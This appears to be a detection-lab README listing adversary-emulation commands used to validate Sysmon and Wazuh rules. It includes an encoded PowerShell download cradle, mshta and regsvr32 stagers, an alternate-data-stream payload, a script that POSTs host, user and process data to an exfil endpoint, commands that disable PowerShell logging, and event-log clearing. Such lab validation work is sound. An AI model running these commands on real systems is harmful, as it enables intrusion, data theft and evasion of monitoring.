# Attack Simulations

> ### ⚠️ Lab use only
> Every command below is an adversary-emulation technique designed only for
> the isolated, host-only virtual lab described in this repository. They are here
> to document how the detection rules were validated and to let others reproduce
> the experiment.

The simulations are grouped into nine individual techniques (A1–A9) and six
chained scenarios (B1–B6), all mapped to MITRE ATT&CK. Several individual steps
reuse [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) tests.
Placeholders such as `<ELK_SERVER_IP>` replace the lab IP address bieng used.


#####   Individual Attack Simulation

#### Powershell encoded cpmmand execution
Step 1: establish realistic parent process 
cmd.exe 
whoami
hostname
ipconfig /all
Step 2: encode realistic command
Step 3 
powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAMAAwAC4AMQAwADoAOAAwAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACIAKQA=


####  Mshta.exe LOLBin execution
Step 1: establish realistic parent process 
cmd.exe 
whoami
hostname
ipconfig /all
Step 2
mshta.exe "javascript:var shell=new ActiveXObject('WScript.Shell');shell.Run('cmd.exe /c whoami > C:\\Windows\\Temp\\recon.txt',0,true);close();"

mshta.exe http://127.0.0.1:8080/stager.hta

mshta.exe vbscript:Close(MsgBox("Simulation complete"))


####  WMI child process execution
Step 1: execute reconn through via WMI
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{
    CommandLine = "cmd.exe /c whoami && net user && ipconfig /all > C:\\Windows\\Temp\\wmi_recon.txt"
}

Step 2: WMI spawn
Start-Sleep -Seconds 10
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{
    CommandLine = "powershell.exe -NoProfile -Command Get-Process | Out-File C:\\Windows\\Temp\\processes.txt"
}


####  Remote thread injection
Step 1: Start injection target process
Start-Process notepad.exe
Start-Sleep -Seconds 3
$target = Get-Process notepad | Select-Object -First 1
Write-Host "Injection target: $($target.Name) PID: $($target.Id)"

Step 2: execute invection via Atomic Red Team
Import-Module invoke-atomicredteam -Force
Invoke-AtomicTest T1055 -TestNumbers 10


#### Regsvr32 Scriptlet Execution
Step 1: Prepare benign scriptlet on a remote host

Step 2: Execute Squiblydoo from windows endpoint
regsvr32.exe /s /n /u /i:http://<ELK_SERVER_IP>:8000/recon.sct scrobj.dll


####  WMI event subscription persistence
Step 1: Execute WMI persistence via Atomic Red Team
Import-Module invoke-atomicredteam -Force
Invoke-AtomicTest T1546.003 -TestNumbers 1

Step 2; verify persistence
Get-WmiObject -Namespace root\subscription -Class __EventFilter | Select-Object Name, Query
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Select-Object Name, CommandLineTemplate
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Select-Object Filter, Consumer


####  Alternate data stream creation
Step 1: create a decoy file
$null | Out-File "C:\Windows\Temp\report.txt"
Add-Content "C:\Windows\Temp\report.txt" "Quarterly report data, Q2 2026"


Step 2: Attach hidden payload stream to the decoy file
Set-Content -Path "C:\Windows\Temp\report.txt" -Stream "payload.ps1" -Value "IEX (New-Object Net.WebClient).DownloadString('http://<ELK_SERVER_IP>/stage2.ps1')"

#### Wazuh FIM
Step 1: Drop second stage script to windows
$stage2Content = @"
\$target = \$env:COMPUTERNAME
\$user = \$env:USERNAME
\$procs = Get-Process | Select-Object Name, Id | ConvertTo-Json
Invoke-WebRequest -Uri "http://<ELK_SERVER_IP>/exfil?host=\$target&user=\$user" -Method POST -Body \$procs
"@
$stage2Content | Out-File "C:\Windows\Temp\WindowsUpdate.ps1"

Step 2: drop a fake executable to AppData
$null | Out-File "$env:APPDATA\svchost32.exe"
Start-Sleep -Seconds 60


####  Registry Policy disabling via registry
Step 1: disable Script block logging
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f

Step 2: Disable module logging
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" /v EnableModuleLogging /t REG_DWORD /d 0 /f

Step 3: Modify Eventlog service path
reg add "HKLM\SYSTEM\CurrentControlSet\Services\EventLog\Application" /v TestEvade /t REG_DWORD /d 0 /f



######  Chained Attack Simulation

#### Defence evasion --> Encoded Powershell --> Process Injection
Step 1: Phase A, Disable script block logging
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f

Step 2: Phase B, Encode PowerShell Execution
powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand "SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTI3LjAuMC4xOjk5OTkvc3RhZ2UyLnBzMScpKQ=="

Step 3: Phase C, Process Injection
Start-Process notepad.exe
Start-Sleep -Seconds 3
Invoke-AtomicTest T1055 -TestNumbers 10



#### Encoded Powershell --> WMI persistence --> Log Clearing
Step 1: Phase A, Encoded powershell execution + WMI Persistence
powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand " SQBuAHYAbwBrAGUALQBBAHQAbwBtAGkAYwBUAGUAcwB0ACAAVAAxADUANAA2AC4AMAAwADMAIAAtAFQAZQBzAHQATgB1AG0AYgBlAHIAcwAgADEA"

Step 2: Phase B, Log clearing
wevtutil cl Application
wevtutil cl System


####  LOLBin execution chain
Step 1: Phase A, mshta LOLBin execution
cmd.exe /c mshta.exe "javascript:var shell=new ActiveXObject('WScript.Shell');shell.Run('cmd.exe /c whoami > C:\\Windows\\Temp\\lolbin_test.txt',0,true);close();"

Step 2: Phase B, WMI spawns comman interpreter
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{
    CommandLine = "cmd.exe /c hostname >> C:\\Windows\\Temp\\lolbin_test.txt"
}


Step 3: Phase c, regsvr32 Squiblydoo
regsvr32.exe /s /n /u /i:http://<ELK_SERVER_IP>:8000/recon.sct scrobj.dll


####  Loggin evasion --> WMI execution --> WMI persistence
Step 1: Phase A, Logging evasion via registry
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f


Step 2: Phase B, WMI execution + WMI persistence installation
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{
    CommandLine = "powershell.exe -NoProfile -EncodedCommand SQBuAHYAbwBrAGUALQBBAHQAbwBtAGkAYwBUAGUAcwB0ACAAVAAxADUANAA2AC4AMAAwADMAIAAtAFQAZQBzAHQATgB1AG0AYgBlAHIAcwAgADEA"
}



####  Cross source, Wazuh alert --> Syamon process injection
Step 1: generate a high severity Wazuh alert on the windows

Step 2: Execute process injection
Start-Process notepad.exe
Start-Sleep -Seconds 3
Invoke-AtomicTest T1055 -TestNumbers 10



####  Wazuh FIM --> Sysmon LOLBin execution --> Sysmon registry
Step 1: File staging 
$payload = @"
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f
"@
$payload | Out-File "C:\Windows\Temp\stage2_payload.ps1"


Step 2: LOLBin execution + Registry Persistence
powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -File "C:\Windows\Temp\stage2_payload.ps1"





